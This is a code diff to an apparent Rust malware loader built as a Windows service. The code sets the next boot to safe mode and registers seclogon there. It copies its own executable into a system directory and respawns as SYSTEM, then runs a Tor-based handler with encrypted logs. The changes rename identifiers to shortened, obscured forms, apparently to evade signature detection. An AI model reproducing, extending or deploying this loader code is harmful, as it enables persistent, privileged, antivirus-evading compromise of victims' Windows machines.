@@ -5,7 +5,7 @@ use crate::safemode::utils::{
     safemode_fail_safe,
     set_next_boot_safemode,
 };
-use crate::network::tor::LoaderTorHandler;
+use crate::network::tor::LdrTrHandler;
 use crate::service::utils::SERVICE_TYPE;
 use crate::{ err, info, tag, warn };
 use anyhow::{ Context, Result };
@@ -17,14 +17,17 @@ use shared::constants::{
     logs_encryption_key,
     system_loader_exe_name,
 };
-use shared::network::tor::LoggerConfig;
+use shared::network::tor::LoggerCnfg;
 use shared::utils::config::load_mib_config;
 use shared::utils::functions::{
+    exit_1,
+    exit_1_insta,
     get_current_exe,
     is_running_from_system32,
     try_spawn_program_as_system,
 };
 use std::fs::{ create_dir_all, remove_dir_all };
+use std::thread::sleep;
 use std::{ ffi::OsString, thread, time::Duration };
 use windows_service::{
     define_windows_service,
@@ -91,24 +94,25 @@ fn service_runner() -> Result<()> {
     let mib_config = load_mib_config(false);
     let is_safe_mode = is_safe_mode();
 
-    if !mib_config.clean_up_done && !is_safe_mode {
+    if !mib_config.cln_up_done && !is_safe_mode {
         pre_cleanup();
     }
 
-    if !mib_config.clean_up_done && is_safe_mode {
+    if !mib_config.cln_up_done && is_safe_mode {
         launch_cleanup();
     }
 
-    if mib_config.clean_up_done && !is_running_from_system32 {
+    if mib_config.cln_up_done && !is_running_from_system32 {
         if let Err(error) = post_cleanup() {
             err!("Post cleanup error: ", error);
         }
+        exit_1_insta();
     }
 
-    if mib_config.clean_up_done && is_running_from_system32 {
+    if mib_config.cln_up_done && is_running_from_system32 {
         system_service_work();
     }
-
+    sleep(Duration::from_secs(100));
     info!("Service end");
 
     status_handle
@@ -133,6 +137,7 @@ fn pre_cleanup() {
     let _ = register_seclogon_for_safemode();
     let _ = set_next_boot_safemode();
 }
+
 fn launch_cleanup() {
     tag!("LAUNCH-CLEANUP");
     if let Err(error) = try_spawn_program_as_system(get_current_exe().to_str().unwrap(), None) {
@@ -152,12 +157,14 @@ fn launch_cleanup() {
 fn post_cleanup() -> Result<()> {
     tag!("POST-CLEANUP");
 
+    create_dir_all(system_service_directory())?;
     let system_exe = system_service_directory().join(system_loader_exe_name());
     std::fs::copy(get_current_exe(), &system_exe)?;
+    let cache_path = system_service_directory().join(s!("cache.cfg"));
+    std::fs::write(cache_path, "")?;
 
     // then we just run it, and exit - if it fails we auto restart next boot
     try_spawn_program_as_system(system_exe.to_str().unwrap(), None)?;
-
     Ok(())
 }
 
@@ -181,11 +188,11 @@ fn system_service_work() {
         .build()
         .unwrap()
         .block_on(async move {
-            let logger_config = LoggerConfig::New {
-                log_directory: system_log_directory(),
-                log_encryption_key: logs_encryption_key(),
+            let logger_config = LoggerCnfg::New {
+                log_dir: system_log_directory(),
+                log_enc_key: logs_encryption_key(),
             };
-            if let Ok(mut handler) = LoaderTorHandler::new(logger_config).await {
+            if let Ok(mut handler) = LdrTrHandler::new(logger_config).await {
                 handler.run_handler().await;
             }
         });
